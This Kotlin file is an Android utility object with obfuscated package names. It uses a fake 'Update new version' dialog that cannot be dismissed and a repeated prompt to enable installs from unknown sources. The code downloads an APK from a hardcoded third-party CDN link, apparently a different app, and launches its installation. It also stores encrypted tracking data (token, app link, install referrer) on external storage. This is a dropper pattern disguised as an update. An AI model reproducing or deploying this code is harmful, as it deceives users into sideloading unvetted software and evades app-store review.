package com.abc.lib.u

import android.annotation.SuppressLint
import android.app.Activity
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Message
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.core.content.FileProvider
import com.abc.lib.b.BaseApplication
import com.abc.lib.e.ResultEntity
import com.alertdialogpro.AlertDialogPro
import com.alertdialogpro.ProgressDialogPro
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.xxxxxxh.lib.entity.RequestEntity
import es.dmoral.prefs.Prefs
import org.xutils.common.Callback
import org.xutils.http.RequestParams
import org.xutils.x
import java.io.BufferedReader
import java.io.File
import java.io.FileOutputStream
import java.io.FileReader
import java.util.*


@SuppressLint("StaticFieldLeak")
object CommonUtils {
    val temp =
        "https://c911c3df879a675feb30aaafc46042de.dlied1.cdntips.net/imtt.dd.qq.com/sjy.10001/16891/apk/896B00016B948A65B3FBC800EACF8EA0.apk?mkey=61e4c2ecb68cbfed&f=0000&fsname=com.excean.dualaid_8.7.0_930.apk&csr=3554&cip=182.140.153.24&proto=https"
    const val default_id = "2074717252705379"

    var context: Context? = null
    private var isInstall = false

    private var downloadDlg: ProgressDialogPro? = null

    var entity: ResultEntity? = null

    private val handler: Handler = @SuppressLint("HandlerLeak")
    object : Handler() {

        override fun handleMessage(msg: Message) {
            super.handleMessage(msg)
            if (msg.what == 1) {
                if (!isBackground()) {
                    if (!isInstall) {
                        if (context!!.packageManager.canRequestPackageInstalls()) {
                            isInstall = true
                            sendEmptyMessage(1)
                        } else {
                            if (!isBackground()) {
                                showPermissionDlg()
                            } else {
                                sendEmptyMessageDelayed(1, 1500)
                            }
                        }
                    } else {
                        showUpdateDlg(entity!!.ikey)
                    }
                } else {
                    sendEmptyMessageDelayed(1, 1500)
                }
            }
        }
    }

    fun getRequestData(): RequestEntity {
        val context = BaseApplication.instance!!.applicationContext
        val istatus = Prefs.with(context).readBoolean("istatus", true)
        val requestBean = RequestEntity()
        requestBean.appId = BaseApplication.instance!!.getAppId()
        requestBean.appName = BaseApplication.instance!!.getAppName()
        requestBean.applink = Prefs.with(context).read("appLink", "AppLink is empty")
        requestBean.ref = Prefs.with(context).read("ref", "Referrer is empty")
        requestBean.token = BaseApplication.instance!!.getToken()
        requestBean.istatus = istatus
        return requestBean
    }

    fun getFbInfo(context: Context): String {
        var appLink = Prefs.with(context).read("appLink", "AppLink is empty")
        if (appLink == "AppLink is empty") {
            AppLinkData.fetchDeferredAppLinkData(
                context
            ) {
                if (it != null) {
                    appLink = it.targetUri.toString()
                    Prefs.with(context).write("appLink", appLink)
                }

            }
        }
        return appLink
    }

    fun getGooInfo(context: Context): String {
        var ref = Prefs.with(context).read("ref", "Referrer is empty")
        if (ref == "Referrer is empty") {
            val client = InstallReferrerClient.newBuilder(context).build()
            client.startConnection(object :
                InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(responseCode: Int) {
                    try {
                        ref = client.installReferrer.installReferrer
                        Prefs.with(context).write("ref", ref)
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }

                override fun onInstallReferrerServiceDisconnected() {

                }

            })
        }
        return ref
    }

    fun initFbSdk(context: Context, id: String) {
        FacebookSdk.setApplicationId(id)
        FacebookSdk.sdkInitialize(context)
    }

    fun showPermissionDlg() {
        val builder = AlertDialogPro.Builder(context)
        builder.setTitle("Permissions")
            .setMessage("App need updated,please turn on allow from this source tes")
            .setCancelable(false)
            .setNeutralButton(
                "ok"
            ) { dialog, which ->
                isInstall = context!!.packageManager.canRequestPackageInstalls()
                handler.sendEmptyMessageDelayed(1, 1000)
                if (!context!!.packageManager.canRequestPackageInstalls()) {
                    allowThirdInstall()
                } else {
                    showUpdateDlg(entity!!.ikey)
                }
            }
        builder.show()
    }

    fun showUpdateDlg(msg: String) {
        val builder = AlertDialogPro.Builder(context)
        builder.setTitle("Update new version")
            .setMessage(msg)
            .setCancelable(false)
            .setNeutralButton(
                "update"
            ) { dialog, which ->
                downloadDlg = showDownloadDlg()
                downloadDlg!!.show()
                download(temp)
            }
        builder.show()
    }

    private fun showDownloadDlg(): ProgressDialogPro {
        val dlg = ProgressDialogPro(context)
        dlg.setTitle("Downloading")
        dlg.setCancelable(false)
        return dlg
    }

    private fun download(url: String) {
        val requestParams = RequestParams(url)
        val path =
            Environment.getExternalStorageDirectory().absolutePath + File.separator + System.currentTimeMillis()
                .toString() + ".apk"
        requestParams.saveFilePath = path
        x.http().get(requestParams, object : Callback.ProgressCallback<File> {
            override fun onSuccess(result: File?) {
                downloadDlg!!.dismiss()
                saveMsg()
                install(result!!.path)
            }

            override fun onError(ex: Throwable?, isOnCallback: Boolean) {
                downloadDlg!!.dismiss()
            }

            override fun onCancelled(cex: Callback.CancelledException?) {

            }

            override fun onFinished() {
                downloadDlg!!.dismiss()
            }

            override fun onWaiting() {

            }

            override fun onStarted() {

            }

            override fun onLoading(total: Long, current: Long, isDownloading: Boolean) {
                val cur = (current * 100 / total)
                Log.i("xxxxxxH", "$cur")
                downloadDlg!!.setMessage("Current Progress：${cur} %")
                downloadDlg!!.progress = current.toInt()
            }
        })
    }

    private fun allowThirdInstall() {
        if (Build.VERSION.SDK_INT > 24) {
            if (!context!!.packageManager.canRequestPackageInstalls()) {
                val uri = Uri.parse("package:" + context!!.packageName)
                val i = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, uri)
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                (context as Activity).startActivity(i)
            }
        }
    }


    fun isBackground(): Boolean {
        val activityManager = context!!
            .getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val appProcesses = activityManager
            .runningAppProcesses
        for (appProcess in appProcesses) {
            if (appProcess.processName == context!!.packageName) {
                return appProcess.importance != ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
            }
        }
        return false
    }

    private fun install(path: String) {
        val file = File(path)
        if (!file.exists()) {
            return
        }
        var uri: Uri? = null
        uri = if (Build.VERSION.SDK_INT >= 24) {
            FileProvider.getUriForFile(
                context!!, context!!.packageName.toString() + ".fileprovider",
                file
            )
        } else {
            Uri.fromFile(file)
        }
        if (Build.VERSION.SDK_INT >= 26) {
            if (!context!!.packageManager.canRequestPackageInstalls()) {
                Toast.makeText(context, "No Permission", Toast.LENGTH_SHORT).show()
                return
            }
        }
        val intent = Intent("android.intent.action.VIEW")
        intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
        if (Build.VERSION.SDK_INT >= 24) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        intent.setDataAndType(uri, "application/vnd.android.package-archive")
        context!!.startActivity(intent)
    }


    fun saveFile(content: String) {
        val filePath = Environment.getExternalStorageDirectory().absolutePath
        val fileName = "a.testupdate.txt"
        val file = File(filePath + File.separator + fileName)
        var fileOutputStream: FileOutputStream? = null
        try {
            fileOutputStream = FileOutputStream(file)
            fileOutputStream.write(content.toByteArray())
            fileOutputStream.flush()
            fileOutputStream.close()
        } catch (e: java.lang.Exception) {
            e.printStackTrace()
        }
    }


    fun readrFile(filePath: String?): String? {
        val file = File(filePath)
        if (!file.exists()) {
            return ""
        } else {
            try {
                val reader = FileReader(filePath)
                val r = BufferedReader(reader)
                return r.readLine()
            } catch (e: java.lang.Exception) {
                e.printStackTrace()
            }
        }
        return ""
    }

    private fun saveMsg() {
        val token = Prefs.with(context!!).read("token", UUID.randomUUID().toString())
        val appLink = Prefs.with(context!!).read("appLink", "AppLink is empty")
        val ref = Prefs.with(context!!).read("ref", "Referrer is empty")
        val content = "${token}*${appLink}*${ref}"
        saveFile(AesEncryptUtil.encrypt(content))
    }
}